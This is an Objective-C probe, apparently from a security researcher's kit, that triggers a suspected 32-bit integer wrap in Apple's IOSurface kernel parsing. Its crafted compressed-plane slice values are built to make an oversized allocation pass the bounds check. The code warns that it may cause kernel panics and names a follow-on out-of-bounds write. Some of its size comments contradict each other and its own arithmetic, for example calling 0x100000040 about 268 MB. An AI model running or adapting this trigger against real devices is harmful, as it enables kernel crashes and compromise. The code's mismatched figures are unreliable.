//
//  P167F1SliceWrap.m — F1 compressed-plane BytesPerSlice 32-bit wrap
//  device-confirmation probe. p167. 2026-11-16.
//
//  Static base (this session, T8101 23F77, fix-twin test /tmp/f1twin):
//    the ONE fn referencing the slice-bounds strings:
//      26.5 0xfffffff00985146c (0x3688) — unchanged bytes through 27.2
//    wrap sites (26.5 coords):
//      0xfffffff0098529a4 mul w9,w10,w9   ; 0x...29ac mul w9,w9,w10
//      0xfffffff009852a5c mul w12,w11,w10 (multi-slice total plan)
//    lsr x,x,#0x20 high-32 gate unchanged in all four builds.
//  What this probe measures (classification, NOT the OOB write):
//    A. control uncompressed  -> expect kr success
//    B. compressed multi-slice shape hunt (3 dict shapes, modest values)
//       -> the shape that creates = the door is the same parse fn
//    C. unwrapped-overshoot (true total > 32 bits, NO wrap)
//       -> expect FAILURE via the caps ("exceeds maximum"/total-plan)
//    D. wrap pair: (Data+Header)*SliceCount wraps mod 2^32 while the TRUE
//       total is ~1 GiB. If IOSurfaceCreate SUCCEEDS here after C failed,
//       the 32-bit wrap BYPASSED the check = the F1 device confirmation.
//       If it FAILS elsewhere, that check is logged honestly and F1 stays
//       static-live but device-unconfirmed.
//    E. on any successful create: IOSurfaceGetAllocSize read-back
//       (did the kernel allocate the wrapped or the true size?).
//  NO render, NO Metal, NO iopl — IOSurfaceCreate from the framework only.
//

#import "P167F1SliceWrap.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"

#import <Foundation/Foundation.h>
#import <CoreFoundation/CoreFoundation.h>
#import <dlfcn.h>

typedef CFTypeRef (*p167_create_t)(CFDictionaryRef);
typedef uint32_t  (*p167_getid_t)(CFTypeRef);
typedef size_t    (*p167_allocs_t)(CFTypeRef);
typedef void    (*p167_release_t)(CFTypeRef);

#define P167_BUILD @"p167-f1-slicewrap-v1"

@implementation P167F1SliceWrap

static p167_create_t  sCreate;
static p167_getid_t   sGetID;
static p167_allocs_t  sAllocSize;
static p167_release_t sRelease;

static CFMutableDictionaryRef p167_baseDict(int32_t w, int32_t h) {
    CFMutableDictionaryRef d = CFDictionaryCreateMutable(
        kCFAllocatorDefault, 8, &kCFTypeDictionaryKeyCallBacks,
        &kCFTypeDictionaryValueCallBacks);
    CFNumberRef nw = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &w);
    CFNumberRef nh = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &h);
    int32_t bpe = 1, bits = 8;
    CFNumberRef nb = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &bpe);
    CFNumberRef nc = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &bits);
    CFDictionarySetValue(d, CFSTR("IOSurfaceWidth"), nw);
    CFDictionarySetValue(d, CFSTR("IOSurfaceHeight"), nh);
    CFDictionarySetValue(d, CFSTR("IOSurfaceBytesPerElement"), nb);
    CFDictionarySetValue(d, CFSTR("IOSurfaceElementBits"), nc);
    int32_t alloc = w * h * bpe;
    CFNumberRef na = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &alloc);
    CFDictionarySetValue(d, CFSTR("IOSurfaceAllocSize"), na);
    CFRelease(nw); CFRelease(nh); CFRelease(nb); CFRelease(nc); CFRelease(na);
    return d;
}

/* plane dict. shape variants (the exact required key set is not public —
   the ladder logs which shape the parse accepts) */
static CFMutableDictionaryRef p167_planeDict(int shape,
                                             int32_t dataPerSlice,
                                             int32_t hdrPerSlice,
                                             int32_t sliceCount) {
    CFMutableDictionaryRef p = CFDictionaryCreateMutable(
        kCFAllocatorDefault, 16, &kCFTypeDictionaryKeyCallBacks,
        &kCFTypeDictionaryValueCallBacks);
    int32_t one = 1;
    CFNumberRef n1 = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &one);
    CFDictionarySetValue(p, CFSTR("IOSurfacePlaneNumber"), n1);
    CFRelease(n1);
    /* compression header/data regions */
    CFNumberRef nd = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &dataPerSlice);
    CFNumberRef nh = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &hdrPerSlice);
    CFDictionarySetValue(p, CFSTR("IOSurfacePlaneDataRegionBytesPerSlice"), nd);
    CFDictionarySetValue(p, CFSTR("IOSurfacePlaneHeaderRegionBytesPerSlice"), nh);
    CFRelease(nd); CFRelease(nh);
    CFNumberRef ns = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &sliceCount);
    CFDictionarySetValue(p, CFSTR("IOSurfaceSliceCount"), ns);
    CFRelease(ns);
    /* interchange-lossy compressed plane plumbing (keys from the 23F77 pool) */
    int32_t ctype = 1;   /* InterchangeLossy selector guess, v1 */
    CFNumberRef nc = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &ctype);
    CFDictionarySetValue(p, CFSTR("IOSurfacePlaneCompressionType"), nc);
    CFRelease(nc);
    int32_t tw = 0x10, th = 0x10;
    CFNumberRef ntw = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &tw);
    CFNumberRef nth = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &th);
    CFDictionarySetValue(p, CFSTR("IOSurfacePlaneCompressedTileWidth"), ntw);
    CFDictionarySetValue(p, CFSTR("IOSurfacePlaneCompressedTileHeight"), nth);
    CFRelease(ntw); CFRelease(nth);
    int32_t wib = 0, hib = 0;
    CFNumberRef nwib = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &wib);
    CFNumberRef nhib = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &hib);
    CFDictionarySetValue(p, CFSTR("IOSurfacePlaneWidthInCompressedTiles"), nwib);
    CFDictionarySetValue(p, CFSTR("IOSurfacePlaneHeightInCompressedTiles"), nhib);
    CFRelease(nwib); CFRelease(nhib);
    int32_t hdrOff = 0, datOff = 0;
    CFNumberRef nho = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &hdrOff);
    CFNumberRef ndo = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &datOff);
    CFDictionarySetValue(p, CFSTR("IOSurfacePlaneCompressedTileHeaderRegionOffset"), nho);
    CFDictionarySetValue(p, CFSTR("IOSurfacePlaneCompressedTileDataRegionOffset"), ndo);
    CFRelease(nho); CFRelease(ndo);
    if (shape >= 2) {
        int32_t bprh = 0, bprd = 0;
        CFNumberRef a = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &bprh);
        CFNumberRef b = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &bprd);
        CFDictionarySetValue(p, CFSTR("IOSurfacePlaneBytesPerRowOfCompressedTileHeaderGroups"), a);
        CFDictionarySetValue(p, CFSTR("IOSurfacePlaneBytesPerRowOfTileData"), b);
        CFRelease(a); CFRelease(b);
        int32_t hsel = 0;
        CFNumberRef c = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &hsel);
        CFDictionarySetValue(p, CFSTR("IOSurfacePlaneHTPCVerticalHeaderGroupingMode"), c);
        CFRelease(c);
    }
    return p;
}

static CFTypeRef p167_attempt(NSMutableString *o, NSString *tag, int shape,
                              int32_t dataPerSlice, int32_t hdrPerSlice,
                              int32_t sliceCount) {
    CFMutableDictionaryRef top = p167_baseDict(0x100, 0x100);
    int32_t pw = 0x10, ph = 0x10, bpe = 1;
    CFMutableArrayRef planes = CFArrayCreateMutable(kCFAllocatorDefault, 1,
                                                   &kCFTypeArrayCallBacks);
    CFMutableDictionaryRef pl = p167_planeDict(shape, dataPerSlice, hdrPerSlice, sliceCount);
    CFNumberRef a = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &pw);
    CFNumberRef b = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &ph);
    CFNumberRef c = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &bpe);
    /* plane size: small true footprint so a wrapped total passes the
       w-mul check while the unwrapped total is ~1 GiB */
    int32_t psize = 0x1000;
    CFNumberRef d = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &psize);
    CFDictionarySetValue(pl, CFSTR("IOSurfacePlaneWidth"), a);
    CFDictionarySetValue(pl, CFSTR("IOSurfacePlaneHeight"), b);
    CFDictionarySetValue(pl, CFSTR("IOSurfacePlaneBytesPerElement"), c);
    CFDictionarySetValue(pl, CFSTR("IOSurfacePlaneSize"), d);
    CFArrayAppendValue(planes, pl);
    CFDictionarySetValue(top, CFSTR("IOSurfacePlaneInfo"), planes);

    CFTypeRef surf = sCreate(top);
    int32_t id = surf ? sGetID(surf) : 0;
    size_t alloc = surf ? (sAllocSize ? sAllocSize(surf) : 0) : 0;
    [o appendFormat:@"  [%@] shape=%d D=%#x H=%#x S=%d -> surf=%@ id=%u alloc=0x%zx\n",
        tag, shape, dataPerSlice, hdrPerSlice, sliceCount,
        surf ? @"YES" : @"NO", id, alloc];
    CFRelease(a); CFRelease(b); CFRelease(c); CFRelease(d);
    CFRelease(pl); CFRelease(planes); CFRelease(top);
    return surf;   /* caller releases via sRelease */
}

+ (NSString *)tap {
    NSMutableString *o = [NSMutableString string];
    [o appendFormat:@"=== p167 session %@ BUILD %@ ===\n", LabLocalMilitaryNow(), P167_BUILD];
    [o appendString:[LabDeviceProfile identBlock]];
    [o appendString:@"F1 device confirmation: compressed-plane BytesPerSlice 32-bit wrap.\n"];
    [o appendString:@"Static: check fn 0x985146c UNCHANGED bytes 26.5->27.2 (fix-twin test).\n"];
    [o appendString:@"PANIC-POSSIBLE (kernel parse/alloc on crafted plane shapes). ONE TAP.\n"];
    [o appendString:@"NO render / NO Metal / NO iopl — IOSurfaceCreate only.\n"];

    void *h = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface",
                     RTLD_LAZY);
    if (!h) h = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    void *d = h ? h : RTLD_DEFAULT;
    sCreate    = (p167_create_t)dlsym(d, "IOSurfaceCreate");
    sGetID     = (p167_getid_t)dlsym(d, "IOSurfaceGetID");
    sAllocSize = (p167_allocs_t)dlsym(d, "IOSurfaceGetAllocSize");
    sRelease   = (p167_release_t)dlsym(d, "CFRelease");
    [o appendFormat:@"  [lib] dlopen=%@ create=%d getid=%d allocsz=%d\n",
        h ? @"ok" : @"fallback",
        sCreate != NULL, sGetID != NULL, sAllocSize != NULL];
    if (!sCreate) { [o appendString:@"[-] no create symbol — probe dead\n"]; return o; }

    /* A. control: uncompressed (no plane info) */
    {
        CFMutableDictionaryRef top = p167_baseDict(0x100, 0x100);
        CFTypeRef s = sCreate(top);
        [o appendFormat:@"  [A control] uncompressed -> surf=%@ id=%u alloc=0x%zx\n",
            s ? @"YES" : @"NO", s ? sGetID(s) : 0u, s && sAllocSize ? sAllocSize(s) : 0];
        if (s) sRelease(s);
        CFRelease(top);
    }

    /* B. shape hunt: modest compressed multi-slice — the accepted shape
       proves our dict reaches the same parse fn */
    int shape = -1;
    for (int v = 1; v <= 2 && shape < 0; v++) {
        CFTypeRef s = p167_attempt(o, @"B shape-hunt", v, 64, 64, 4);
        if (s) { shape = v; sRelease(s); }
    }
    if (shape < 0) {
        [o appendString:@"  [res] no compressed shape accepted — dict shape inconclusive\n"];
        [o appendString:@"  [*] static verdict stands: check fn unchanged 26.5->27.2\n"];
        return o;
    }
    [o appendFormat:@"  [+] shape=%d accepted — same parse fn reached\n", shape];

    /* C. unwrapped overshoot: true total 0x3E000020 — NO wrap; caps must reject */
    CFTypeRef s = p167_attempt(o, @"C unwrapped", shape, 0x1f000010, 0x10, 2);
    BOOL unwrappedRejected = (s == NULL);
    if (s) sRelease(s);
    [o appendFormat:@"  [*] C verdict: unwrapped-overshoot %s\n",
        unwrappedRejected ? @"REJECTED (bounds engaged)" : @"ACCEPTED (unexpected!)"];

    /* D. wrap pair: D+H = 0x40000000, S=4 -> (D+H)*S wraps mod 2^32 to 0
       while the true total is 0x100000040 (~268 MB). C rejected its
       no-wrap twin; D passing = the w-mul wrap BYPASSED the check. */
    s = p167_attempt(o, @"D WRAP", shape, 0x3fff0000, 0x00010000, 4);
    if (s) {
        sRelease(s);
        [o appendString:@"  [+] D result: ACCEPTED — 32-bit wrap bypassed the slice\n"
                         "      total-plan check. F1 DEVICE-CONFIRMED at classification\n"
                         "      level (parse accepts ~268 MB true total as 'fits ').\n"
                         "      The AGX-side OOB write is a SEPARATE tap — not fired here.\n"];
    } else {
        [o appendString:@"  [-] D result: rejected — the wrap value pair did not pass;\n"
                         "      logged for the ladder. Static verdict unchanged.\n"];
    }
    [o appendString:@"=== p167 done (one tap per force-quit) ===\n"];
    return o;
}

@end
